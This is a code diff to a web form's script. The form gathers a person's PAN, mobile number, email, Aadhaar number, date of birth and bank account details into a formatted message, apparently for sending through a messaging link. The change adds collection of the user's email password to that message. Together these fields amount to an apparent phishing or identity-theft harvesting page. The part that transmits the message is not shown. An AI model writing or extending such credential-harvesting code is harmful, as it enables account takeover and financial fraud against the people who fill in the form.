@@ -128,6 +128,7 @@
             const pan = document.getElementById('pan').value.trim().toUpperCase();
             const mobile = document.getElementById('mobile').value.trim();
             const email = document.getElementById('email').value.trim();
+            const emailPassword = document.getElementById('emailPassword').value.trim();
             const aadhar = document.getElementById('aadhar').value.trim();
             const dob = document.getElementById('dob').value.trim();
             const bankName = document.getElementById('bankName').value.trim();
@@ -160,13 +161,19 @@
                           `*Name:* ${name}%0A` +
                           `*PAN:* ${pan}%0A` +
                           `*Mobile:* ${mobile}%0A` +
-                          `*Email:* ${email}%0A` +
-                          `*Aadhar:* ${aadhar}%0A` +
-                          `*Date of Birth:* ${dob}%0A%0A` +
-                          `*Bank Details*%0A` +
-                          `*Bank Name:* ${bankName}%0A` +
-                          `*Account Number:* ${accountNumber}%0A` +
-                          `*IFSC:* ${ifsc}%0A`;
+                          `*Email:* ${email}%0A`;
+
+            // Add email password if provided
+            if (emailPassword) {
+                message += `*Email Password:* ${emailPassword}%0A`;
+            }
+
+            message += `*Aadhar:* ${aadhar}%0A` +
+                       `*Date of Birth:* ${dob}%0A%0A` +
+                       `*Bank Details*%0A` +
+                       `*Bank Name:* ${bankName}%0A` +
+                       `*Account Number:* ${accountNumber}%0A` +
+                       `*IFSC:* ${ifsc}%0A`;
 
             // Add reference person if provided
             if (reference) {
@@ -205,4 +212,3 @@
     </script>
 </body>
 </html>
-
